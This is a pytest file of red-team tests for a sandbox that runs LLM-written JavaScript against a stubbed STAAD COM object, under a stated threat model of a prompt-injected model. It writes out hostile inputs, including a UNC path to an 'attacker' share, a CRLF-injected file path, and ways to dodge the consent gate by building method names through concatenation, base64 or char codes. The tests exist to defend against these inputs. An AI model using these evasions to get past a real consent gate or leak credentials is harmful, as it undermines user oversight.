"""
---------------------------------------------------------------------------------------------
Copyright (c) Bentley Systems, Incorporated. All rights reserved.
See LICENSE.md in the project root for license terms and full copyright notice.
---------------------------------------------------------------------------------------------

Red-team tests: COM argument type confusion.

These tests probe whether an attacker can abuse COM late-binding type
coercion by passing unexpected JSON types (dicts, nested lists, booleans,
nulls) where the COM API expects strings or integers.

Threat model: a prompt-injected LLM constructs arguments designed to
trigger unexpected behaviour in pywin32's VARIANT marshaling.

These run against the stub STAAD object (no live COM needed).
"""

from __future__ import annotations

from typing import Any

import pytest

from openstaad_mcp.sandbox.wasm_executor import WasmExecutor


# ---------------------------------------------------------------------------
# Stub STAAD — records what arguments COM methods actually receive
# ---------------------------------------------------------------------------


class _RecordingGeometry:
    """Records method calls for argument inspection."""

    def __init__(self) -> None:
        self.calls: list[tuple[str, tuple[Any, ...]]] = []

    def GetNodeCount(self) -> int:
        return 42

    def GetNodeCoordinates(self, nid: int) -> list[float]:
        self.calls.append(("GetNodeCoordinates", (nid,)))
        return [float(nid), 0.0, 0.0]

    def AddNode(self, x: float, y: float, z: float) -> int:
        self.calls.append(("AddNode", (x, y, z)))
        return 99


class _RecordingView:
    def __init__(self) -> None:
        self.calls: list[tuple[str, tuple[Any, ...]]] = []

    def ExportView(self, loc: str, name: str, fmt: int, overwrite: bool) -> int:
        self.calls.append(("ExportView", (loc, name, fmt, overwrite)))
        return 0

    def GetWindowCount(self) -> int:
        return 1


class _RecordingStaad:
    def __init__(self) -> None:
        self.Geometry = _RecordingGeometry()
        self.View = _RecordingView()
        self.calls: list[tuple[str, tuple[Any, ...]]] = []

    def GetBaseUnit(self) -> str:
        return "Metric"

    def NewSTAADFile(self, path: str, typ: int = 1, ui: int = 0) -> int:
        self.calls.append(("NewSTAADFile", (path, typ, ui)))
        return 0

    def OpenSTAADFile(self, path: str) -> int:
        self.calls.append(("OpenSTAADFile", (path,)))
        return 0

    def SaveModel(self) -> int:
        self.calls.append(("SaveModel", ()))
        return 0

    def Quit(self) -> None:
        self.calls.append(("Quit", ()))


@pytest.fixture
def executor() -> WasmExecutor:
    return WasmExecutor(timeout_seconds=5.0)


@pytest.fixture
def staad() -> _RecordingStaad:
    return _RecordingStaad()


# ---------------------------------------------------------------------------
# Argument type confusion — non-string args where strings are expected
# ---------------------------------------------------------------------------


class TestArgTypeConfusion:
    """Pass unexpected JSON types as arguments to COM methods and verify
    the sandbox handles them safely."""

    def test_dict_as_path_argument(
        self, executor: WasmExecutor, staad: _RecordingStaad
    ) -> None:
        """Pass a dict where a string path is expected.
        COM's IDispatch::Invoke should reject it with a type error."""
        r = executor.execute(
            "staad.NewSTAADFile({toString: function() { return '\\\\\\\\attacker\\\\share\\\\evil.std'; }}, 1, 0)",
            staad,
            allow_destructive=True,
        )
        if r.success:
            # The dict was passed through to COM. Check what COM received.
            assert staad.calls
            path_arg = staad.calls[-1][1][0]
            # In Python, the dict arrives as a Python dict (JSON-deserialized).
            # COM's IDispatch::Invoke would reject it with a type error.
            assert not isinstance(path_arg, str) or not path_arg.startswith("\\\\"), (
                f"Dict-with-toString was coerced to UNC path: {path_arg!r}"
            )

    def test_array_as_path_argument(
        self, executor: WasmExecutor, staad: _RecordingStaad
    ) -> None:
        """Pass an array where a string path is expected."""
        r = executor.execute(
            r"staad.NewSTAADFile(['\\\\attacker\\share', 'evil.std'], 1, 0)",
            staad,
            allow_destructive=True,
        )
        if r.success:
            assert staad.calls
            path_arg = staad.calls[-1][1][0]
            assert not isinstance(path_arg, str) or not path_arg.startswith("\\\\"), (
                f"Array was coerced to UNC path string: {path_arg!r}"
            )

    def test_number_as_path_argument(
        self, executor: WasmExecutor, staad: _RecordingStaad
    ) -> None:
        """Pass a number where a string path is expected."""
        r = executor.execute(
            "staad.NewSTAADFile(12345, 1, 0)",
            staad,
            allow_destructive=True,
        )
        if r.success:
            assert staad.calls
            path_arg = staad.calls[-1][1][0]
            assert isinstance(path_arg, (int, float))

    def test_null_as_path_argument(
        self, executor: WasmExecutor, staad: _RecordingStaad
    ) -> None:
        """Pass null where a string path is expected."""
        r = executor.execute(
            "staad.NewSTAADFile(null, 1, 0)",
            staad,
            allow_destructive=True,
        )
        if r.success:
            assert staad.calls
            path_arg = staad.calls[-1][1][0]
            assert path_arg is None

    def test_boolean_as_path_argument(
        self, executor: WasmExecutor, staad: _RecordingStaad
    ) -> None:
        """Pass true where a string path is expected."""
        r = executor.execute(
            "staad.NewSTAADFile(true, 1, 0)",
            staad,
            allow_destructive=True,
        )
        if r.success:
            assert staad.calls
            path_arg = staad.calls[-1][1][0]
            assert isinstance(path_arg, bool)

    def test_nested_dict_as_argument(
        self, executor: WasmExecutor, staad: _RecordingStaad
    ) -> None:
        """Pass a deeply nested dict. pywin32 VARIANT marshaling may
        behave unexpectedly with complex Python objects."""
        r = executor.execute(
            "staad.Geometry.AddNode({x: 1, nested: {deep: true}}, 2.0, 3.0)",
            staad,
        )
        if r.success:
            assert staad.Geometry.calls
            arg = staad.Geometry.calls[-1][1][0]
            # Python stub receives a dict — real COM would type-error
            assert isinstance(arg, dict)

    def test_very_large_string_argument(
        self, executor: WasmExecutor, staad: _RecordingStaad
    ) -> None:
        """Pass a very large string. Tests whether the JSON boundary
        has implicit size limits and whether COM handles it."""
        r = executor.execute(
            "staad.NewSTAADFile('A'.repeat(100000), 1, 0)",
            staad,
            allow_destructive=True,
        )
        if r.success:
            assert staad.calls
            path_arg = staad.calls[-1][1][0]
            assert isinstance(path_arg, str)
            assert len(path_arg) == 100000

    def test_special_characters_in_path(
        self, executor: WasmExecutor, staad: _RecordingStaad
    ) -> None:
        """Path with CRLF, tabs, and other control characters."""
        r = executor.execute(
            r"staad.NewSTAADFile('C:\\temp\\evil\r\nHeader: injected\t.std', 1, 0)",
            staad,
            allow_destructive=True,
        )
        if r.success:
            assert staad.calls
            path_arg = staad.calls[-1][1][0]
            assert isinstance(path_arg, str)


# ---------------------------------------------------------------------------
# Consent gate bypass via runtime method name construction
# ---------------------------------------------------------------------------


class TestConsentGateEvasion:
    """Verify the runtime consent gate (inside com_invoke) catches
    destructive methods even when the pre-flight scan is evaded."""

    def test_string_concat_evades_preflight_but_runtime_blocks(
        self, executor: WasmExecutor, staad: _RecordingStaad
    ) -> None:
        """Construct 'SaveModel' via concatenation — pre-flight won't
        see it, but the runtime DESTRUCTIVE_METHODS check must block it."""
        r = executor.execute(
            "const m = 'Save' + 'Model'; staad[m]()",
            staad,
        )
        assert not r.success
        assert "blocked" in (r.error or "").lower()
        assert not staad.calls

    def test_base64_method_name(
        self, executor: WasmExecutor, staad: _RecordingStaad
    ) -> None:
        """Construct method name via atob() — if available."""
        r = executor.execute(
            'try { const m = atob("U2F2ZU1vZGVs"); staad[m](); return "called"; }'
            ' catch(e) { return "error: " + e.message; }',
            staad,
        )
        if r.success:
            result = str(r.result)
            # Either atob doesn't exist (blocked) or the runtime check blocked it
            assert "called" not in result or "blocked" in result.lower()
        assert not staad.calls

    def test_charcode_method_name(
        self, executor: WasmExecutor, staad: _RecordingStaad
    ) -> None:
        """Construct 'Quit' from char codes."""
        r = executor.execute(
            "const m = String.fromCharCode(81, 117, 105, 116); "
            "try { staad[m](); return 'called'; } catch(e) { return 'error: ' + e.message; }",
            staad,
        )
        if r.success:
            assert "called" not in str(r.result)
        assert not staad.calls

    def test_computed_property_on_sub_object(
        self, executor: WasmExecutor, staad: _RecordingStaad
    ) -> None:
        """Construct 'ExportView' dynamically on View sub-object."""
        r = executor.execute(
            "const m = ['Export', 'View'].join(''); "
            "staad.View[m]('C:/temp', 'shot', 1, true)",
            staad,
        )
        assert not r.success
        assert "blocked" in (r.error or "").lower()
        assert not staad.View.calls

    def test_computed_property_with_flag(
        self, executor: WasmExecutor, staad: _RecordingStaad
    ) -> None:
        """Same computed property, but WITH allow_destructive=True —
        should succeed (the runtime gate opens)."""
        r = executor.execute(
            "const m = ['Export', 'View'].join(''); "
            "staad.View[m]('C:/temp', 'shot', 1, true)",
            staad,
            allow_destructive=True,
        )
        assert r.success, r.error
        assert len(staad.View.calls) == 1
        assert staad.View.calls[0][0] == "ExportView"


# ---------------------------------------------------------------------------
# Argument injection — extra/missing arguments
# ---------------------------------------------------------------------------


class TestArgumentBoundary:
    """Test edge cases in argument passing."""

    def test_extra_arguments_ignored(
        self, executor: WasmExecutor, staad: _RecordingStaad
    ) -> None:
        """Pass more args than the method expects. Python will raise
        TypeError which should be caught and sanitized."""
        r = executor.execute(
            "staad.Geometry.GetNodeCount(1, 2, 3, 'extra')",
            staad,
        )
        # GetNodeCount() takes 0 args — extra args cause TypeError
        assert not r.success
        assert "TypeError" in (r.error or "") or "error" in (r.error or "").lower()

    def test_no_arguments_when_required(
        self, executor: WasmExecutor, staad: _RecordingStaad
    ) -> None:
        """Call a method that requires args without providing them."""
        r = executor.execute(
            "staad.Geometry.GetNodeCoordinates()",
            staad,
        )
        assert not r.success
        assert r.error is not None

    def test_very_many_arguments(
        self, executor: WasmExecutor, staad: _RecordingStaad
    ) -> None:
        """Pass hundreds of arguments. Tests JSON parsing and the
        fn(*args) splat."""
        r = executor.execute(
            "const args = new Array(500).fill(0); "
            "staad.Geometry.AddNode(...args)",
            staad,
        )
        # AddNode takes 3 args — 500 will TypeError
        assert not r.success
        assert r.error is not None

    def test_infinity_as_numeric_arg(
        self, executor: WasmExecutor, staad: _RecordingStaad
    ) -> None:
        """JSON doesn't support Infinity — it becomes null in JSON.stringify.
        Test what the host function receives."""
        r = executor.execute(
            "staad.Geometry.AddNode(Infinity, -Infinity, NaN)",
            staad,
        )
        # JSON.stringify converts Infinity/NaN to null in standard JSON.
        # The host function receives null, null, null → AddNode(None, None, None)
        # which will either TypeError or produce unexpected COM behaviour.
        if r.success:
            assert staad.Geometry.calls
            args = staad.Geometry.calls[-1][1]
            # Verify they came through as None (JSON null), not as float('inf')
            for a in args:
                assert a is None or isinstance(a, (int, float))

    def test_undefined_becomes_null(
        self, executor: WasmExecutor, staad: _RecordingStaad
    ) -> None:
        """JS undefined becomes null in JSON → None in Python."""
        r = executor.execute(
            "staad.Geometry.GetNodeCoordinates(undefined)",
            staad,
        )
        if r.success:
            assert staad.Geometry.calls
            arg = staad.Geometry.calls[-1][1][0]
            assert arg is None
